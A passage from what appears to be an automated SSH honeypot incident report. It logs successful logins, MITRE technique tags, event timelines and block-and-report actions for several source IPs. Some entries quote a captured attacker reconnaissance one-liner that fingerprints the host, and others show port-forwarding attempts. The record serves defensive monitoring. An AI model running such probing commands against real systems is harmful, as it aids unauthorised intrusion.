| `2026-07-09 17:26:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c96ae1f6bd6f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 17:28 |
| **Last Seen** | 2026-07-09 17:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 17:28:08` | `cowrie.session.connect` |
| `2026-07-09 17:28:08` | `cowrie.client.version` |
| `2026-07-09 17:28:08` | `cowrie.client.kex` |
| `2026-07-09 17:28:08` | `cowrie.login.success` |
| `2026-07-09 17:28:09` | `cowrie.session.params` |
| `2026-07-09 17:28:09` | `cowrie.command.input` |
| `2026-07-09 17:28:09` | `cowrie.command.input` |
| `2026-07-09 17:28:09` | `cowrie.command.input` |
| `2026-07-09 17:28:09` | `cowrie.command.input` |
| `2026-07-09 17:28:09` | `cowrie.command.input` |
| `2026-07-09 17:28:09` | `cowrie.command.success` |
| `2026-07-09 17:28:09` | `cowrie.command.input` |
| `2026-07-09 17:28:09` | `cowrie.command.input` |
| `2026-07-09 17:28:09` | `cowrie.command.input` |
| `2026-07-09 17:28:09` | `cowrie.command.input` |
| `2026-07-09 17:28:09` | `cowrie.log.closed` |
| `2026-07-09 17:28:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-72597cd836f2

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-09 17:28 |
| **Last Seen** | 2026-07-09 17:28 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 17:28:24` | `cowrie.session.connect` |
| `2026-07-09 17:28:27` | `cowrie.client.version` |
| `2026-07-09 17:28:27` | `cowrie.client.kex` |
| `2026-07-09 17:28:32` | `cowrie.login.success` |
| `2026-07-09 17:28:35` | `cowrie.session.params` |
| `2026-07-09 17:28:35` | `cowrie.command.input` |
| `2026-07-09 17:28:37` | `cowrie.log.closed` |
| `2026-07-09 17:28:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4420bb13060a

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-09 17:29 |
| **Last Seen** | 2026-07-09 17:29 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 17:29:43` | `cowrie.session.connect` |
| `2026-07-09 17:29:43` | `cowrie.client.version` |
| `2026-07-09 17:29:43` | `cowrie.client.kex` |
| `2026-07-09 17:29:44` | `cowrie.login.success` |
| `2026-07-09 17:29:45` | `cowrie.session.params` |
| `2026-07-09 17:29:45` | `cowrie.command.input` |
| `2026-07-09 17:29:45` | `cowrie.log.closed` |
| `2026-07-09 17:29:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ac221ad96fd2

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 17:29 |
| **Last Seen** | 2026-07-09 17:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 17:29:54` | `cowrie.session.connect` |
| `2026-07-09 17:29:54` | `cowrie.client.version` |
| `2026-07-09 17:29:54` | `cowrie.client.kex` |
| `2026-07-09 17:29:54` | `cowrie.login.success` |
| `2026-07-09 17:29:55` | `cowrie.session.params` |
| `2026-07-09 17:29:55` | `cowrie.command.input` |
| `2026-07-09 17:29:55` | `cowrie.command.input` |
| `2026-07-09 17:29:55` | `cowrie.command.input` |
| `2026-07-09 17:29:55` | `cowrie.command.input` |
| `2026-07-09 17:29:55` | `cowrie.command.input` |
| `2026-07-09 17:29:55` | `cowrie.command.success` |
| `2026-07-09 17:29:55` | `cowrie.command.input` |
| `2026-07-09 17:29:55` | `cowrie.command.input` |
| `2026-07-09 17:29:55` | `cowrie.command.input` |
| `2026-07-09 17:29:55` | `cowrie.command.input` |
| `2026-07-09 17:29:55` | `cowrie.log.closed` |
| `2026-07-09 17:29:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-31e19a76f169

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 17:31 |
| **Last Seen** | 2026-07-09 17:31 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 17:31:36` | `cowrie.session.connect` |
| `2026-07-09 17:31:36` | `cowrie.client.version` |
| `2026-07-09 17:31:36` | `cowrie.client.kex` |
| `2026-07-09 17:31:37` | `cowrie.login.success` |
| `2026-07-09 17:31:38` | `cowrie.session.params` |
| `2026-07-09 17:31:38` | `cowrie.command.input` |
| `2026-07-09 17:31:38` | `cowrie.command.input` |
| `2026-07-09 17:31:38` | `cowrie.command.input` |
| `2026-07-09 17:31:38` | `cowrie.command.input` |
| `2026-07-09 17:31:38` | `cowrie.command.input` |
| `2026-07-09 17:31:38` | `cowrie.command.success` |
| `2026-07-09 17:31:38` | `cowrie.command.input` |
| `2026-07-09 17:31:38` | `cowrie.command.input` |
| `2026-07-09 17:31:38` | `cowrie.command.input` |
| `2026-07-09 17:31:38` | `cowrie.command.input` |
| `2026-07-09 17:31:38` | `cowrie.log.closed` |
| `2026-07-09 17:31:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc8d730a3f5d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 17:33 |
| **Last Seen** | 2026-07-09 17:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 17:33:18` | `cowrie.session.connect` |
| `2026-07-09 17:33:19` | `cowrie.client.version` |
| `2026-07-09 17:33:19` | `cowrie.client.kex` |
| `2026-07-09 17:33:19` | `cowrie.login.success` |
| `2026-07-09 17:33:20` | `cowrie.session.params` |
| `2026-07-09 17:33:20` | `cowrie.command.input` |
| `2026-07-09 17:33:20` | `cowrie.command.input` |
| `2026-07-09 17:33:20` | `cowrie.command.input` |
| `2026-07-09 17:33:20` | `cowrie.command.input` |
| `2026-07-09 17:33:20` | `cowrie.command.input` |
| `2026-07-09 17:33:20` | `cowrie.command.success` |
| `2026-07-09 17:33:20` | `cowrie.command.input` |
| `2026-07-09 17:33:20` | `cowrie.command.input` |
| `2026-07-09 17:33:20` | `cowrie.command.input` |
| `2026-07-09 17:33:20` | `cowrie.command.input` |
| `2026-07-09 17:33:20` | `cowrie.log.closed` |
| `2026-07-09 17:33:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f2007c7f208a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 17:35 |
| **Last Seen** | 2026-07-09 17:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 17:35:01` | `cowrie.session.connect` |
| `2026-07-09 17:35:01` | `cowrie.client.version` |
| `2026-07-09 17:35:01` | `cowrie.client.kex` |
| `2026-07-09 17:35:02` | `cowrie.login.success` |
| `2026-07-09 17:35:03` | `cowrie.session.params` |
| `2026-07-09 17:35:03` | `cowrie.command.input` |
| `2026-07-09 17:35:03` | `cowrie.command.input` |
| `2026-07-09 17:35:03` | `cowrie.command.input` |
| `2026-07-09 17:35:03` | `cowrie.command.input` |
| `2026-07-09 17:35:03` | `cowrie.command.input` |
| `2026-07-09 17:35:03` | `cowrie.command.success` |
| `2026-07-09 17:35:03` | `cowrie.command.input` |
| `2026-07-09 17:35:03` | `cowrie.command.input` |
| `2026-07-09 17:35:03` | `cowrie.command.input` |
| `2026-07-09 17:35:03` | `cowrie.command.input` |
| `2026-07-09 17:35:03` | `cowrie.log.closed` |
| `2026-07-09 17:35:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-abebd98d3f61

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 17:36 |
| **Last Seen** | 2026-07-09 17:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 17:36:53` | `cowrie.session.connect` |
| `2026-07-09 17:36:53` | `cowrie.client.version` |
| `2026-07-09 17:36:54` | `cowrie.client.kex` |
| `2026-07-09 17:36:54` | `cowrie.login.success` |
| `2026-07-09 17:36:55` | `cowrie.session.params` |
| `2026-07-09 17:36:55` | `cowrie.command.input` |
| `2026-07-09 17:36:55` | `cowrie.command.input` |
| `2026-07-09 17:36:55` | `cowrie.command.input` |
| `2026-07-09 17:36:55` | `cowrie.command.input` |
| `2026-07-09 17:36:55` | `cowrie.command.input` |
| `2026-07-09 17:36:55` | `cowrie.command.success` |
| `2026-07-09 17:36:55` | `cowrie.command.input` |
| `2026-07-09 17:36:55` | `cowrie.command.input` |
| `2026-07-09 17:36:55` | `cowrie.command.input` |
| `2026-07-09 17:36:55` | `cowrie.command.input` |
| `2026-07-09 17:36:55` | `cowrie.log.closed` |
| `2026-07-09 17:36:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d6e909515c2

| Field | Detail |
|---|---|
| **Source IP** | `78.187.9[.]111` |
| **First Seen** | 2026-07-09 17:38 |
| **Last Seen** | 2026-07-09 17:38 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 17:38:09` | `cowrie.session.connect` |
| `2026-07-09 17:38:09` | `cowrie.client.version` |
| `2026-07-09 17:38:09` | `cowrie.client.kex` |
| `2026-07-09 17:38:10` | `cowrie.login.success` |
| `2026-07-09 17:38:11` | `cowrie.direct-tcpip.request` |
| `2026-07-09 17:38:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `78.187.9[.]111` to AbuseIPDB if not already reported
- [ ] Block `78.187.9[.]111` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4431e4bd34b4

| Field | Detail |
|---|---|
| **Source IP** | `220.134.25[.]203` |
| **First Seen** | 2026-07-09 17:38 |
| **Last Seen** | 2026-07-09 17:38 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 17:38:16` | `cowrie.session.connect` |
| `2026-07-09 17:38:17` | `cowrie.client.version` |
| `2026-07-09 17:38:17` | `cowrie.client.kex` |
| `2026-07-09 17:38:19` | `cowrie.login.success` |
| `2026-07-09 17:38:19` | `cowrie.direct-tcpip.request` |
| `2026-07-09 17:38:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.134.25[.]203` to AbuseIPDB if not already reported
- [ ] Block `220.134.25[.]203` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-43656e54b02d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 17:38 |
| **Last Seen** | 2026-07-09 17:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 17:38:54` | `cowrie.session.connect` |
| `2026-07-09 17:38:54` | `cowrie.client.version` |
| `2026-07-09 17:38:54` | `cowrie.client.kex` |
| `2026-07-09 17:38:54` | `cowrie.login.success` |
| `2026-07-09 17:38:55` | `cowrie.session.params` |
| `2026-07-09 17:38:55` | `cowrie.command.input` |
| `2026-07-09 17:38:55` | `cowrie.command.input` |
| `2026-07-09 17:38:55` | `cowrie.command.input` |
| `2026-07-09 17:38:55` | `cowrie.command.input` |
| `2026-07-09 17:38:55` | `cowrie.command.input` |
| `2026-07-09 17:38:55` | `cowrie.command.success` |
| `2026-07-09 17:38:55` | `cowrie.command.input` |
| `2026-07-09 17:38:55` | `cowrie.command.input` |
| `2026-07-09 17:38:55` | `cowrie.command.input` |
| `2026-07-09 17:38:55` | `cowrie.command.input` |
| `2026-07-09 17:38:55` | `cowrie.log.closed` |
| `2026-07-09 17:38:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-352c1e8340d1

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-09 17:39 |
| **Last Seen** | 2026-07-09 17:39 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 17:39:29` | `cowrie.session.connect` |
| `2026-07-09 17:39:30` | `cowrie.client.version` |
| `2026-07-09 17:39:30` | `cowrie.client.kex` |
| `2026-07-09 17:39:36` | `cowrie.login.success` |
| `2026-07-09 17:39:40` | `cowrie.session.params` |
| `2026-07-09 17:39:40` | `cowrie.command.input` |
| `2026-07-09 17:39:42` | `cowrie.log.closed` |
| `2026-07-09 17:39:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c6117d525c4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 17:40 |
| **Last Seen** | 2026-07-09 17:40 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 17:40:36` | `cowrie.session.connect` |
| `2026-07-09 17:40:36` | `cowrie.client.version` |
| `2026-07-09 17:40:36` | `cowrie.client.kex` |
| `2026-07-09 17:40:36` | `cowrie.login.success` |
| `2026-07-09 17:40:37` | `cowrie.session.params` |
| `2026-07-09 17:40:37` | `cowrie.command.input` |
| `2026-07-09 17:40:37` | `cowrie.command.input` |
| `2026-07-09 17:40:37` | `cowrie.command.input` |
| `2026-07-09 17:40:37` | `cowrie.command.input` |
| `2026-07-09 17:40:37` | `cowrie.command.input` |
| `2026-07-09 17:40:37` | `cowrie.command.success` |
| `2026-07-09 17:40:37` | `cowrie.command.input` |
| `2026-07-09 17:40:37` | `cowrie.command.input` |
| `2026-07-09 17:40:37` | `cowrie.command.input` |
| `2026-07-09 17:40:37` | `cowrie.command.input` |
| `2026-07-09 17:40:38` | `cowrie.log.closed` |
| `2026-07-09 17:40:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fa2a7a08db29

| Field | Detail |
|---|---|
| **Source IP** | `75.80.65[.]214` |
| **First Seen** | 2026-07-09 17:40 |
| **Last Seen** | 2026-07-09 17:40 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 17:40:45` | `cowrie.session.connect` |
| `2026-07-09 17:40:46` | `cowrie.client.version` |
| `2026-07-09 17:40:46` | `cowrie.client.kex` |
| `2026-07-09 17:40:48` | `cowrie.login.success` |
| `2026-07-09 17:40:48` | `cowrie.direct-tcpip.request` |
| `2026-07-09 17:40:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `75.80.65[.]214` to AbuseIPDB if not already reported
- [ ] Block `75.80.65[.]214` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b48bff243bd

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 17:42 |
| **Last Seen** | 2026-07-09 17:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 17:42:18` | `cowrie.session.connect` |
| `2026-07-09 17:42:18` | `cowrie.client.version` |
| `2026-07-09 17:42:18` | `cowrie.client.kex` |
| `2026-07-09 17:42:18` | `cowrie.login.success` |
| `2026-07-09 17:42:19` | `cowrie.session.params` |
| `2026-07-09 17:42:19` | `cowrie.command.input` |
| `2026-07-09 17:42:19` | `cowrie.command.input` |
| `2026-07-09 17:42:19` | `cowrie.command.input` |
| `2026-07-09 17:42:19` | `cowrie.command.input` |
| `2026-07-09 17:42:19` | `cowrie.command.input` |
| `2026-07-09 17:42:19` | `cowrie.command.success` |
| `2026-07-09 17:42:19` | `cowrie.command.input` |
| `2026-07-09 17:42:19` | `cowrie.command.input` |
| `2026-07-09 17:42:19` | `cowrie.command.input` |
| `2026-07-09 17:42:19` | `cowrie.command.input` |
| `2026-07-09 17:42:19` | `cowrie.log.closed` |
| `2026-07-09 17:42:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fa5597f25b59

| Field | Detail |
|---|---|
| **Source IP** | `196.189.124[.]218` |
| **First Seen** | 2026-07-09 17:43 |
| **Last Seen** | 2026-07-09 17:43 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
